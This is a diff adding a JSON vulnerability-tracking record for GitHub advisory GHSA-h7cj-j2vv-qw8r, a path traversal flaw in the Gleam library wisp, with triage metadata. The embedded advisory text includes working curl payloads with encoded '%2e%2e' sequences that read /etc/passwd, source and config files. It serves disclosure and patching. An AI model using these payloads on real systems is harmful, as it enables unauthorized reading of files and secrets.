@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/44654?v=4\", \"events_url\": \"https://api.github.com/users/jtdowney/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/jtdowney/followers\", \"following_url\": \"https://api.github.com/users/jtdowney/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/jtdowney/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/jtdowney\", \"id\": 44654, \"login\": \"jtdowney\", \"node_id\": \"MDQ6VXNlcjQ0NjU0\", \"organizations_url\": \"https://api.github.com/users/jtdowney/orgs\", \"received_events_url\": \"https://api.github.com/users/jtdowney/received_events\", \"repos_url\": \"https://api.github.com/users/jtdowney/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/jtdowney/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/jtdowney/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/jtdowney\", \"user_view_type\": \"public\"}}, {\"type\": \"remediation_developer\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/6134406?v=4\", \"events_url\": \"https://api.github.com/users/lpil/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/lpil/followers\", \"following_url\": \"https://api.github.com/users/lpil/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/lpil/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/lpil\", \"id\": 6134406, \"login\": \"lpil\", \"node_id\": \"MDQ6VXNlcjYxMzQ0MDY=\", \"organizations_url\": \"https://api.github.com/users/lpil/orgs\", \"received_events_url\": \"https://api.github.com/users/lpil/received_events\", \"repos_url\": \"https://api.github.com/users/lpil/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/lpil/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/lpil/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/lpil\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-28807\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 8.7, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}], \"description\": \"### Summary\\n\\n`wisp.serve_static` is vulnerable to arbitrary file read via percent-encoded path traversal (`%2e%2e`). The directory traversal sanitization runs before percent-decoding, allowing encoded `..` sequences to bypass the filter. An unauthenticated attacker can read any file readable by the application process in a single HTTP request.\\n\\n### Details\\n\\nIn `src/wisp.gleam`, `serve_static` processes the request path in this order:\\n\\n```gleam\\nlet path =\\n  path\\n  |> string.drop_start(string.length(prefix))\\n  |> string.replace(each: \\\"..\\\", with: \\\"\\\")   // Step 1: sanitize\\n  |> filepath.join(directory, _)\\n\\nlet path = case uri.percent_decode(path) {  // Step 2: decode\\n  Ok(p) -> p\\n  Error(_) -> path\\n}\\n```\\n\\nSanitization (step 1) strips literal `..` but runs **before** percent-decoding (step 2). The encoded sequence `%2e%2e` passes through `string.replace` unchanged, then `uri.percent_decode` converts it to `..`, which the OS resolves as directory traversal when the file is read.\\n\\n### PoC\\n\\nAny application using `wisp.serve_static`:\\n\\n```gleam\\nfn handle_request(req: wisp.Request) -> wisp.Response {\\n  use <- wisp.serve_static(req, under: \\\"/static\\\", from: priv_directory())\\n  wisp.not_found()\\n}\\n```\\n\\nExploit (requires `--path-as-is` to prevent client-side normalization):\\n\\n```bash\\n# Read /etc/passwd\\ncurl -s --path-as-is \\\\\\n  \\\"http://localhost:8080/static/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\\\"\\n\\n# Read project source code\\ncurl -s --path-as-is \\\\\\n  \\\"http://localhost:8080/static/%2e%2e/%2e%2e/src/app.gleam\\\"\\n\\n# Read project config\\ncurl -s --path-as-is \\\\\\n  \\\"http://localhost:8080/static/%2e%2e/%2e%2e/gleam.toml\\\"\\n```\\n\\n### Impact\\n\\nThis is a **path traversal / arbitrary file read** vulnerability (CWE-22). Any application using `wisp.serve_static` is affected. An unauthenticated attacker can read:\\n\\n- Application source code\\n- Configuration and secrets in `priv/`\\n- `.env` files, `secret_key_base`, private keys\\n- System files (`/etc/passwd`, `/etc/shadow` if permissions allow)\\n\\n### Workaround\\n\\nCopy the [fixed implementation](https://github.com/gleam-wisp/wisp/blob/161118c431047f7ef1ff7cabfcc38981877fdd93/src/wisp.gleam#L1413-L1461) to your codebase and replace references to wisp.serve_static with this version in your codebase.\\n\\n### References\\n\\n* Commit that introduced the vulnerability: https://github.com/gleam-wisp/wisp/commit/129dcb1fe10ab1e676145d91477535e1c90ab550\\n* Patch Commit: https://github.com/gleam-wisp/wisp/commit/161118c431047f7ef1ff7cabfcc38981877fdd93\", \"epss\": {\"percentage\": 0.01056, \"percentile\": 0.60579}, \"ghsa_id\": \"GHSA-h7cj-j2vv-qw8r\", \"github_reviewed_at\": \"2026-03-11T00:11:39Z\", \"html_url\": \"https://github.com/advisories/GHSA-h7cj-j2vv-qw8r\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-h7cj-j2vv-qw8r\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-28807\"}], \"nvd_published_at\": \"2026-03-10T22:16:18Z\", \"published_at\": \"2026-03-11T00:11:39Z\", \"references\": [\"https://github.com/gleam-wisp/wisp/security/advisories/GHSA-h7cj-j2vv-qw8r\", \"https://github.com/gleam-wisp/wisp/commit/129dcb1fe10ab1e676145d91477535e1c90ab550\", \"https://github.com/gleam-wisp/wisp/commit/161118c431047f7ef1ff7cabfcc38981877fdd93\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-28807\", \"https://cna.erlef.org/cves/CVE-2026-28807.html\", \"https://osv.dev/vulnerability/EEF-CVE-2026-28807\", \"https://github.com/advisories/GHSA-h7cj-j2vv-qw8r\"], \"repository_advisory_url\": \"https://api.github.com/repos/gleam-wisp/wisp/security-advisories/GHSA-h7cj-j2vv-qw8r\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/gleam-wisp/wisp\", \"summary\": \"Wisp Vulnerable to Path Traversal\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T23:41:36Z\", \"url\": \"https://api.github.com/advisories/GHSA-h7cj-j2vv-qw8r\", \"vulnerabilities\": [{\"first_patched_version\": \"2.2.1\", \"package\": {\"ecosystem\": \"erlang\", \"name\": \"wisp\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 2.1.1, < 2.2.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-h7cj-j2vv-qw8r",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "wisp: >= 2.1.1, < 2.2.1"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-28807"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "wisp"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:00.090928Z",
+  "provenance": {
+    "content_sha256": "01c691f0996b778247953e395e1f919035ee968d491d6edb08c9e39c259de955",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-03-11T00:11:39Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-h7cj-j2vv-qw8r",
+  "status": "active",
+  "title": "Wisp Vulnerable to Path Traversal",
+  "updated_at": "2026-06-08T23:41:36Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-h7cj-j2vv-qw8r"
+}
